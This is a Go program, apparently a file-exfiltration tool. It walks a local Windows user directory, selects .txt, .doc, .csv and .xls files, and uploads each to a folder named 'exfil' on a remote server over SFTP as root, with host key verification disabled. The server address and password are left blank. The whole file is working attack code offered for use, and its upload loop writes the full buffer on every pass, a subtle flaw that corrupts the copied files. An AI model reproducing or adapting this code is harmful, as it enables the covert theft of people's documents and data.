package main

import (
	"fmt"
	"io/fs"
	"log"
	"os"
	"path"
	"path/filepath"
	"time"

	"github.com/fatih/color"
	"github.com/pkg/sftp"
	"golang.org/x/crypto/ssh"
)

var (
	auth          []ssh.AuthMethod
	REMOTE_SERVER string
	clientConfig  *ssh.ClientConfig
	sshClient     *ssh.Client
	sftpClient    *sftp.Client
	err           error
)

func CheckExtension(file string) {
	ext := filepath.Ext(file)
	if ext == ".txt" || ext == ".doc" || ext == ".csv" || ext == ".xls" {
		fmt.Println(file)
		uploadFiles(file)
	}
}

func connect(user, pass, ip_addr string, port int) (*sftp.Client, error) {
	auth = make([]ssh.AuthMethod, 0)
	auth = append(auth, ssh.Password(pass))
	clientConfig = &ssh.ClientConfig{
		User:            user,
		HostKeyCallback: ssh.InsecureIgnoreHostKey(),
		Auth:            auth,
		Timeout:         30 * time.Second,
	}
	REMOTE_SERVER = fmt.Sprintf("%s:%d", ip_addr, port)

	if sshClient, err = ssh.Dial("tcp", REMOTE_SERVER, clientConfig); err != nil {
		return nil, err
	}

	if sftpClient, err = sftp.NewClient(sshClient); err != nil {
		return nil, err
	}
	return sftpClient, nil

}

func uploadFiles(file string) {
	var (
		err        error
		sftpClient *sftp.Client
	)
	sftpClient, err = connect("root", "", "", 22)
	if err != nil {
		fmt.Println(err)
	}

	defer sftpClient.Close()
	var localFilePath = file
	var remoteFilePath = "/mnt/volume_sgp1_01/exfil"
	srcFile, err := os.Open(localFilePath)
	if err != nil {
		log.Println(err)
	}
	defer srcFile.Close()
	var remoteFfileName = path.Base(localFilePath)
	dstFile, err := sftpClient.Create(path.Join(remoteFilePath, remoteFfileName))

	if err != nil {
		log.Println(err)
	}
	defer dstFile.Close()
	buf := make([]byte, 1024)

	for {
		n, _ := srcFile.Read(buf)
		if n == 0 {
			break
		}
		dstFile.Write(buf)
	}

	color.Red("[+] File uploaded successfully")

}

func ExecuteEx() ([]string, error) {
	LOCAL_DIRECTORY := `C:\Users\anuwat\Desktop\Test\`
	FILES := make([]string, 0)
	err := filepath.Walk(LOCAL_DIRECTORY, func(path string, info fs.FileInfo, err error) error {
		FILES = append(FILES, path)
		return nil
	})

	if err != nil {
		fmt.Println(err)
	}

	for _, file := range FILES {
		CheckExtension(file)
	}

	return FILES, err

}

func main() {
	ExecuteEx()
}
